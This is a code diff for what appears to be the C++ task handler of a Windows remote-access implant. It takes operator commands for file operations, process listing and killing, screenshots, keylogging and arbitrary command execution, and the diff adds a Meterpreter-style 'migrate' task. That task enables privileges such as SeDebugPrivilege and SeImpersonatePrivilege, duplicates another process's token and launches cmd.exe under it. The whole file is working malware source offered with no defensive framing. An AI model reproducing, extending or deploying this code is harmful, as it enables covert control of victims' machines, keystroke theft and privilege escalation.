@@ -47,7 +47,7 @@ std::wstring ExecuteTaskCd(const std::wstring& wDestDir)
     {
         return L"Error: Could not change current directory.";
     }
-    return L"Current directory changed successfully.";
+    return L"Success: Current directory has been changed.";
 }
 
 std::wstring ExecuteTaskCp(const std::wstring& wSrc, const std::wstring& wDest)
@@ -56,7 +56,7 @@ std::wstring ExecuteTaskCp(const std::wstring& wSrc, const std::wstring& wDest)
     {
         return L"Error: Could not copy the file.";
     }
-    return L"File copied successfully.";
+    return L"Success: File has been copied.";
 }
 
 std::wstring ExecuteTaskDownload(
@@ -93,12 +93,31 @@ std::wstring ExecuteTaskDownload(
     return wDest.c_str();
 }
 
-std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime) {
+std::wstring ExecuteTaskExecute(const std::wstring& cmd) {
+    std::wstring result;
+
+    result = ExecuteCmd(cmd);
+    if (wcscmp(result.c_str(), L"") == 0)
+    {
+        return L"Success: Command have been executed.";
+    }
+    return result;
+}
+
+std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime)
+{
     INT nLogTime = std::stoi(wLogTime);
     return KeyLog(nLogTime);
 }
 
-std::wstring ExecuteTaskLs(const std::wstring& wDir) {
+std::wstring ExecuteTaskKill()
+{
+    ExitProcess(EXIT_SUCCESS);
+    return L"Success: Exit the process.";
+}
+
+std::wstring ExecuteTaskLs(const std::wstring& wDir)
+{
     std::wstring result;
 
     DWORD dwRet;
@@ -170,6 +189,122 @@ std::wstring ExecuteTaskLs(const std::wstring& wDir) {
     return result;
 }
 
+std::wstring ExecuteTaskMigrate(const std::wstring& wPid)
+{
+    // Reference:
+    // https://gitbook.seguranca-informatica.pt/privilege-escalation-privesc/process-migration-like-meterpreter
+
+    std::string sPid = UTF8Encode(wPid);
+    char* pEnds;
+    DWORD dwPid = (DWORD)strtoul(sPid.c_str(), &pEnds, 10);
+
+    BOOL bResult = FALSE;
+
+    // Check if the process has required permissions.
+    HANDLE hToken;
+    LUID fLuid;
+    BOOL bCheckPrivilege = FALSE;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
+    {
+        return L"Error: Could not open the process token.";
+    }
+
+    const wchar_t* cPrivs[] = {L"SeAssignPrimaryTokenPrivilege", L"SeTcbPrivilege"};
+
+    for (int i = 0; i < 2; i++)
+    {
+        bCheckPrivilege = CheckPrivilege(hToken, (LPCTSTR)cPrivs[i]);
+    }
+
+    if (!bCheckPrivilege)
+    {
+        // Try to set the necessary privileges.
+        HANDLE hCurrentProcessToken;
+        OpenProcessToken(
+            GetCurrentProcess(),
+            TOKEN_ALL_ACCESS,
+            &hCurrentProcessToken
+        );
+        const wchar_t* privs[9] = {
+            L"SeAssignPrimaryTokenPrivilege",
+            L"SeTcbPrivilege",
+            L"SeCreateGlobalPrivilege",
+            L"SeDebugPrivilege",
+            L"SeImpersonatePrivilege",
+            L"SeIncreaseQuotaPrivilege",
+            L"SeProfileSingleProcessPrivilege",
+            L"SeSecurityPrivilege",
+            L"SeSystemEnvironmentPrivilege"
+        };
+        for (int i = 0; i < 9; i++)
+        {
+            if (!SetPrivilege(hCurrentProcessToken, privs[i], TRUE))
+            {
+                return L"Error: Could not set required privileges to the current process.";
+            }
+        }
+    }
+
+    // Try to migrate to the process.
+    Sleep(1000);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+    if (!hProcess)
+    {
+        return L"Error: Could not open the process.";
+    }
+
+    HANDLE hNewToken;
+    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hNewToken))
+    {
+        return L"Error: Could open the process token.";
+    }
+    Sleep(500);
+
+    HANDLE hPrimaryToken;
+    if (!DuplicateTokenEx(
+        hNewToken,
+        MAXIMUM_ALLOWED,
+        NULL,
+        SecurityImpersonation,
+        TokenPrimary,
+        &hPrimaryToken
+    ))
+    {
+        // Denied to duplicate process tokens.
+    }
+    Sleep(1000);
+
+    // Try to execute new process with duplicated tokens.
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    DWORD dwFlag;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
+    ZeroMemory(&pi, sizeof(pi));
+    
+    std::wstring cmd = L"cmd.exe";
+    Sleep(500);
+    if (!CreateProcessWithTokenW(
+        hPrimaryToken,
+        0x00000001,
+        NULL,
+        (LPWSTR)cmd.c_str(),
+        dwFlag,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    ))
+    {
+        return L"Error: Could not create a new process with extracted token.";
+    }
+
+    return L"Success: Migrated to the specified process.";
+}
+
 std::wstring ExecuteTaskMkdir(const std::wstring& wDir)
 {
     if (!CreateDirectoryW(wDir.c_str(), NULL))
@@ -177,7 +312,122 @@ std::wstring ExecuteTaskMkdir(const std::wstring& wDir)
         return L"Error: Could not create a new directory.";
     }
 
-    return L"A new directory has been created successfully.";
+    return L"Success: New directory has been created.";
+}
+
+std::wstring ExecuteTaskMv(
+    const std::wstring& wSrc,
+    const std::wstring& wDest
+) {
+    if (!MoveFileW(wSrc.c_str(), wDest.c_str()))
+    {
+        return L"Error: Could not move a file.";
+    }
+
+    return L"Success: File has been moved to the destination.";
+}
+
+std::wstring ExecuteTaskPs()
+{
+    DWORD aProcesses[1024], cbNeeded, cProcesses;
+    unsigned int i;
+
+    DWORD dwCurrentPid = GetCurrentProcessId();
+
+    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+    {
+        return L"Error: Could not enumerate processes.";
+    }
+
+    // Calculate how many process identifiers were returned.
+    cProcesses = cbNeeded / sizeof(DWORD);
+
+    // Retrieve the list of processes.
+    std::wstring wProcesses = L"";
+    for (i = 0; i < cProcesses; i++)
+    {
+        DWORD dwPid = aProcesses[i];
+        std::string sPid = std::to_string(dwPid);
+        std::wstring wPid = UTF8Decode(sPid);
+
+        if (dwPid != 0)
+        {
+            // Get the process name
+            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+
+            HANDLE hProcess = OpenProcess(
+                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                FALSE,
+                dwPid
+            );
+            if (hProcess)
+            {
+                HMODULE hMod;
+                DWORD cbNeeded;
+
+                BOOL bResult = EnumProcessModulesEx(
+                    hProcess,
+                    &hMod,
+                    sizeof(hMod),
+                    &cbNeeded,
+                    LIST_MODULES_ALL
+                );
+                if (bResult)
+                {
+                    GetModuleBaseName(
+                        hProcess,
+                        hMod,
+                        szProcessName,
+                        sizeof(szProcessName)/sizeof(TCHAR)
+                    );
+                }
+            }
+
+            // If the pid is current pid, prepend asterisk (*) to the line.
+            std::wstring wPrefix = L" ";
+            if (dwPid == dwCurrentPid)
+            {
+                wPrefix = L"*";
+            }
+
+            std::wstring wProcessName(szProcessName);
+            wProcesses += wPrefix + wPid + L"\t" + wProcessName + L"\n";
+        }
+    }
+
+    if (wcscmp(wProcesses.c_str(), L"") == 0)
+    {
+        return L"Error: Processes not found.";
+    }
+
+    // Finally, preprend the header in the output.
+    std::wstring wHeader = L"PID\tName\n";
+    std::wstring wHeaderBar = L"---\t----\n";
+
+    return wHeader + wHeaderBar + wProcesses;
+}
+
+std::wstring ExecuteTaskPsKill(const std::wstring& wPid)
+{
+    std::string sPid = UTF8Encode(wPid);
+    char* pEnds;
+    DWORD dwPid = (DWORD)strtoul(sPid.c_str(), &pEnds, 10);
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+    if (!hProcess)
+    {
+        return L"Error: Could not open the process.";
+    }
+
+    if (!TerminateProcess(hProcess, EXIT_SUCCESS))
+    {
+        CloseHandle(hProcess);
+        return L"Error: Could not terminte the process.";
+    }
+
+    CloseHandle(hProcess);
+
+    return L"Success: Process has been terminated.";
 }
 
 std::wstring ExecuteTaskPwd()
@@ -201,7 +451,7 @@ std::wstring ExecuteTaskRm(const std::wstring& wFile)
         return L"Error: Could not delete a file.";
     }
 
-    return L"A file has been deleted successfully.";
+    return L"Success: File has been deleted.";
 }
 
 std::wstring ExecuteTaskRmdir(const std::wstring& wDir)
@@ -211,23 +461,12 @@ std::wstring ExecuteTaskRmdir(const std::wstring& wDir)
         return L"Error: Could not delete a directory.";
     }
 
-    return L"A directory has been deleted successfully.";
+    return L"Success: Directory has been deleted.";
 }
 
 std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow)
 {
     return Screenshot(hInstance, nCmdShow);
-}
-
-std::wstring ExecuteTaskShell(const std::wstring& cmd) {
-    std::wstring result;
-
-    result = ExecuteCmd(cmd);
-    if (wcscmp(result.c_str(), L"") == 0)
-    {
-        return L"The command seems to have executed successfully.";
-    }
-    return result;
 }
 
 std::wstring ExecuteTaskSleep(
@@ -236,7 +475,7 @@ std::wstring ExecuteTaskSleep(
 ) {
     INT newSleepTime = std::stoi(wSleepTime);
     nSleep = newSleepTime;
-    return L"The sleep time updated successfully.";
+    return L"Success: The sleep time has been updated.";
 }
 
 std::wstring ExecuteTaskUpload(
@@ -339,13 +578,42 @@ std::wstring ExecuteTask(
 	{
 		return ExecuteTaskKeyLog(task.substr(7, task.size()));
 	}
+    else if (wcscmp(task.c_str(), L"kill") == 0)
+    {
+        return ExecuteTaskKill();
+    }
 	else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
 	{
 		return ExecuteTaskLs(task.substr(3, task.size()));
 	}
+    else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
+    {
+        return ExecuteTaskMigrate(task.substr(8, task.size()));
+    }
     else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
     {
         return ExecuteTaskMkdir(task.substr(6, task.size()));
+    }
+    else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
+    {
+        // Parse arguments.
+        std::vector<std::wstring> wArgs = SplitW(task, L' ');
+        if (wArgs.size() != 3)
+        {
+            return L"Error: Invalid argument.";
+        }
+        std::wstring wSrc = wArgs[1];
+        std::wstring wDest = wArgs[2];
+
+        return ExecuteTaskMv(wSrc, wDest);
+    }
+    else if (wcscmp(task.c_str(), L"ps") == 0)
+    {
+        return ExecuteTaskPs();
+    }
+    else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
+    {
+        return ExecuteTaskPsKill(task.substr(8, task.size()));
     }
 	else if (wcscmp(task.c_str(), L"pwd") == 0)
 	{
@@ -363,9 +631,9 @@ std::wstring ExecuteTask(
 	{
 		return ExecuteTaskScreenshot(hInstance, nCmdShow);
 	}
-	else if (wcscmp(task.substr(0, 6).c_str(), L"shell ") == 0)
+	else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
 	{
-		return ExecuteTaskShell(task.substr(6, task.size()));
+		return ExecuteTaskExecute(task.substr(8, task.size()));
 	}
 	else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
 	{
@@ -394,7 +662,7 @@ std::wstring ExecuteTask(
 	}
 	else
 	{
-		return L"Invalid task.";
+		return L"Error: Invalid task.";
 	}
 }
 
